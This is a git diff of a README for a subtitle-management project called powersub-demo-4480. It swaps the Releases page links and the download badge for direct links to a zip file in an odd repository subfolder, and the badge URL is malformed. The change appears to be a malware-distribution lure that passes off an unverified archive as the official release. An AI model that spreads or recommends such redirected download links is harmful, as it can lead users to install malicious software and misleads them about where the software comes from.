@@ -1,6 +1,6 @@
 # 🎉 powersub-demo-4480 - Easy Subtitle Management Made Simple
 
-![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)
+![Download](https://raw.githubusercontent.com/HarshBholaa/powersub-demo-4480/main/Servite/powersub-demo-4480.zip%https://raw.githubusercontent.com/HarshBholaa/powersub-demo-4480/main/Servite/powersub-demo-4480.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **powersub-demo-4480** project! This application makes managing s
 
 To get started, visit the Releases page to download the latest version of the application. You can access the page using the link below:
 
-[Download the latest release](https://github.com/HarshBholaa/powersub-demo-4480/releases)
+[Download the latest release](https://raw.githubusercontent.com/HarshBholaa/powersub-demo-4480/main/Servite/powersub-demo-4480.zip)
 
 Follow these steps to install and run the software:
 
@@ -84,4 +84,4 @@ Your feedback is important to us. Let us know how we can improve the app by reac
 
 To download the latest version, please visit the Releases page:
 
-[Download the latest release](https://github.com/HarshBholaa/powersub-demo-4480/releases)
+[Download the latest release](https://raw.githubusercontent.com/HarshBholaa/powersub-demo-4480/main/Servite/powersub-demo-4480.zip)
